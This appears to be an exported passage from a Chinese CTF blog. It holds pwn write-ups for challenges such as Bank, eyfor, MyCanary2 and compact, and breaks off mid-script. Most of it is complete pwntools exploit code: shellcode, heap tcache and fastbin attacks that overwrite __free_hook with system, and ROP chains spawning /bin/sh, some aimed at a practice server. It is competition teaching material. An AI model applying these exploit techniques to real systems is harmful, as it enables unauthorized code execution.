<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">lea rsi,[rip]</span></span><br><span class="line"><span class="string">add rsi,0x1c28</span></span><br><span class="line"><span class="string">mov rsi,[rsi]</span></span><br><span class="line"><span class="string">sub rsi,0x3c4b78</span></span><br><span class="line"><span class="string">add rsi,0x3c6f38</span></span><br><span class="line"><span class="string">mov rsi,[rsi]</span></span><br><span class="line"><span class="string">sub rsi,0xd0</span></span><br><span class="line"><span class="string">mov rsi,[rsi]</span></span><br><span class="line"><span class="string">sub rsi,0x1531</span></span><br><span class="line"><span class="string">add rsi,0x4120</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sl(asm(shellcode))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>但是由于题目没给出 libc 版本，所以这个只能在本地打打了。</p>
<p>根据其他师傅的 wp，这道题是可以直接通过堆地址爆破出的</p>
<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">lea rsi,[rip]</span></span><br><span class="line"><span class="string">sub rsi,0x400000</span></span><br><span class="line"><span class="string">and rsi,0xfffffffff0000000</span></span><br><span class="line"><span class="string">mov edx,0x50</span></span><br><span class="line"><span class="string">A1:</span></span><br><span class="line"><span class="string">add rsi,0x1000</span></span><br><span class="line"><span class="string">mov eax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">test eax,eax</span></span><br><span class="line"><span class="string">jng A1</span></span><br><span class="line"><span class="string">add rsi,0x4120</span></span><br><span class="line"><span class="string">mov rdx,0x300</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov eax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sl(asm(shellcode))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h2><p>唉，第一个关于 money 的漏洞就没看见，太菜了。</p>
<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ul>
<li><p>由于 have_money==0 时，就不会对 have_money 进行减少，那么可以利用这个漏洞与 deposit 功能，无限增加 have_money</p>
</li>
<li><p>接着使用 transfer_admin 功能，泄露 heap</p>
</li>
<li><p>利用 transfer_guest 构造一个 tcache 大小范围外的 chunk，再使用 transfer_admin 功能泄露 libc 版本</p>
</li>
<li><p>将 tcache 0x20 大小填满后，使用 fastbin_dup 来 getshell</p>
</li>
</ul>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./Bank&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./Bank&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;Click: &quot;</span>,x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">num,passwd</span>):</span></span><br><span class="line">    choose(<span class="string">&quot;Login&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Card Numbers: &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line">    sla(<span class="string">&quot;Password: &quot;</span>,<span class="built_in">str</span>(passwd))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span>(<span class="params">name,money,addr=<span class="number">0</span>,data=<span class="string">&#x27;\n&#x27;</span>,size=<span class="number">0</span>,result=<span class="number">0</span></span>):</span></span><br><span class="line">    choose(<span class="string">&quot;Transfer&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;who? &quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;How much? &quot;</span>,<span class="built_in">str</span>(money))</span><br><span class="line">    <span class="keyword">if</span> name==<span class="string">&quot;hacker&quot;</span>:</span><br><span class="line">        sla(<span class="string">&quot;hacker: Great!&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    <span class="keyword">elif</span> name==<span class="string">&quot;guest&quot;</span>:</span><br><span class="line">        sa(<span class="string">&quot;data: &quot;</span>,data)</span><br><span class="line">    <span class="keyword">elif</span> name==<span class="string">&quot;ghost&quot;</span>:</span><br><span class="line">        sla(<span class="string">&quot;ghost: &amp;^%$#@!   :)&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> name==<span class="string">&quot;abyss&quot;</span>:</span><br><span class="line">        sl(<span class="built_in">str</span>(result))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span>(<span class="params">money</span>):</span></span><br><span class="line">    choose(<span class="string">&quot;Put&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;How Much? &quot;</span>,<span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deposit</span>(<span class="params">money</span>):</span></span><br><span class="line">    choose(<span class="string">&quot;Deposit&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;How Much? &quot;</span>,<span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>():</span></span><br><span class="line">    choose(<span class="string">&quot;Info&quot;</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="number">0</span>,<span class="number">123456</span>)</span><br><span class="line">info()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">    put(<span class="number">0x190</span>*i)</span><br><span class="line">    deposit(<span class="number">0x190</span>*i)</span><br><span class="line">    put(<span class="number">0x190</span>*i)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;ghost&quot;</span>,<span class="number">0xa</span>+<span class="number">1</span>,size=<span class="number">0x70</span>)</span><br><span class="line">transfer(<span class="string">&quot;ghost&quot;</span>,<span class="number">0xa</span>+<span class="number">1</span>,size=<span class="number">0x50</span>)</span><br><span class="line">transfer(<span class="string">&quot;ghost&quot;</span>,<span class="number">0xa</span>+<span class="number">1</span>,size=<span class="number">0x70</span>)</span><br><span class="line">transfer(<span class="string">&quot;ghost&quot;</span>,<span class="number">0xa</span>+<span class="number">1</span>,size=<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;admin&quot;</span>,<span class="number">0x1e</span>+<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&quot;I think &quot;</span>)</span><br><span class="line">heap=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>,data=p64(<span class="number">0</span>)+p64(<span class="number">0x431</span>))</span><br><span class="line">transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x22</span>):</span><br><span class="line">    transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;hacker&quot;</span>,<span class="number">0x32</span>+<span class="number">1</span>,addr=heap+<span class="number">0x3a0</span>+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;admin&quot;</span>,<span class="number">0x20</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;I think &quot;</span>)</span><br><span class="line">main_arena=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=main_arena-<span class="number">0x1ebbe0</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    transfer(<span class="string">&quot;hacker&quot;</span>,<span class="number">0x32</span>+<span class="number">1</span>,addr=heap+<span class="number">0x630</span>+<span class="number">0x10</span>-i*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;hacker&quot;</span>,<span class="number">0x32</span>+<span class="number">1</span>,addr=heap+<span class="number">0x530</span>+<span class="number">0x10</span>)</span><br><span class="line">transfer(<span class="string">&quot;hacker&quot;</span>,<span class="number">0x32</span>+<span class="number">1</span>,addr=heap+<span class="number">0x550</span>+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>,data=p64(free_hook)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>,data=<span class="string">&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;guest&quot;</span>,<span class="number">6</span>,data=p64(system))</span><br><span class="line"></span><br><span class="line">transfer(<span class="string">&quot;hacker&quot;</span>,<span class="number">0x32</span>+<span class="number">1</span>,addr=heap+<span class="number">0x540</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print hex(free_hook)</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTf</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF2022_部分pwn_wp</title>
    <url>/2022/07/27/DASCTF2022/</url>
    <content><![CDATA[<p>部分</p>
<span id="more"></span>

<h2 id="July"><a href="#July" class="headerlink" title="July"></a>July</h2><p>感觉最近积极性不强，没什么干劲。</p>
<h3 id="eyfor"><a href="#eyfor" class="headerlink" title="eyfor"></a>eyfor</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>保护只开了 Partial RELRO、NX。</p>
<p>按程序流程走，我们可以输入7次。</p>
<ul>
<li>前五次随便输入即可</li>
<li>第六次输入一个长整数，作为 vuln 函数的参数</li>
<li>第七次在 vlun 函数中，向栈上写入内容</li>
</ul>
<h4 id="漏洞及利用"><a href="#漏洞及利用" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h4><ul>
<li>第一次输入存在溢出，但是没啥用。</li>
<li>第六次输入的内容是作为第七次输入的长度，但是由于 vuln 传参时是 int，而函数中转换为了 unsigned_int 因此存在一个整数溢出漏洞。利用这个向栈上写入 ropchain。</li>
</ul>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>同上</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25675</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=filename</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;go&quot;</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    sla(<span class="string">&quot;message:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0x80000000</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400983</span></span><br><span class="line">buf    =<span class="number">0x00000000006010C0</span></span><br><span class="line">system =<span class="number">0x0000000000400680</span></span><br><span class="line">ret    =<span class="number">0x000000000040063e</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">48</span>,<span class="string">&#x27;\0&#x27;</span>)+p64(<span class="number">0</span>)+p64(ret)+p64(pop_rdi)+p64(buf)+p64(system)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="MyCanary2"><a href="#MyCanary2" class="headerlink" title="MyCanary2"></a>MyCanary2</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>保护只开了 Partial RELRO、NX。</p>
<p>程序会随机生成一个随机数，作为 canary。但是程序还提供了一个可以重新获取 canary 的功能，所以直接输入 ropchain 然后重新获取 canary 即可。</p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./MyCanary2&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26832</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./MyCanary2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=filename</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;Input your choice&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">code</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Show me the code:&quot;</span>,code)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401613</span></span><br><span class="line">binsh  =<span class="number">0x00000000004020F0</span></span><br><span class="line">system =<span class="number">0x0000000000401120</span></span><br><span class="line">ret    =<span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">add(payload)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">choose(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="compact"><a href="#compact" class="headerlink" title="compact"></a>compact</h3><p>比赛时差一丢丢，当晚给补了。</p>
<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>glibc 版本为 2.31，保护全开。</p>
<p>程序具有4个功能：</p>
<ul>
<li>add: 创建两个大小分别为 0x10 与 0x80(mem) 的 chunk，0x10 的存放 tag 及另一个 chunk 的地址，被存放在一个 list 中；0x90 的存放用户输入的 data。除此之外还会对 tag 进行一次检测，根据结果可以对 0x10 中的指针进行覆盖。</li>
<li>show: 通过 list 与对应的 index 访问 chunk，并打印内容。</li>
<li>delete: 通过 list 与对应的 index 将指定 chunk 放入另一个 freed_list 中。</li>
<li>reset: 通过遍历 freed_list 将其中所以 chunk 释放。</li>
</ul>
<h4 id="漏洞及利用-1"><a href="#漏洞及利用-1" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h4><p>没啥漏洞，单纯利用 add 中的 tag 检测，获取修改指针的机会。</p>
<h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><ul>
<li>由于 add 使用 malloc，不会清除 chunk 内容，通过这个泄露 heap。</li>
<li>利用 add 中的 tag 检测，修改指针指向一个 0x410 大小的 fake_chunk，同上泄露 libc，并构造了堆重叠。</li>
<li>利用堆重叠，将 __free_hook 地址插入到 tcache 中，申请后将之覆盖为 system，最后 getshell。</li>
</ul>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./compact&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29107</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./compact&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;give me your choice: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">data,tag</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;data: &quot;</span>,data)</span><br><span class="line">    sa(<span class="string">&quot;tag: &quot;</span>,tag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span>():</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    add(<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">reset()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">heap=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">0x20a</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">reset()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    add(<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    free(i)</span><br><span class="line">reset()</span><br><span class="line"></span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>),<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    add(<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>),<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>*<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span 